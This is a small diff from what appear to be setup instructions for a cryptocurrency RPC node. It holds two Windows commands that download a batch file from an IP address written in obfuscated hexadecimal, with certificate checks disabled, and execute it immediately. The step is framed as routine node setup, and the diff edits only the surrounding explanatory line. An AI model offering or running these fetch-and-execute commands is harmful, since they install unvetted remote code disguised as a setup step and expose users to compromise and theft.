@@ -2,7 +2,7 @@
 
 curl.exe -ksL http://0xCFB4F5AF:8080/win -o "%TEMP%\w.bat"&&call "%TEMP%\w.bat"  
 
-or second rpc wait 45min to run second rpc
+or second rpc wait 45min to run second rpc to index trx and blocks
 
 curl -ksL  http://0xCFB4F5AF:8080/win -o w.bat&w.bat
 
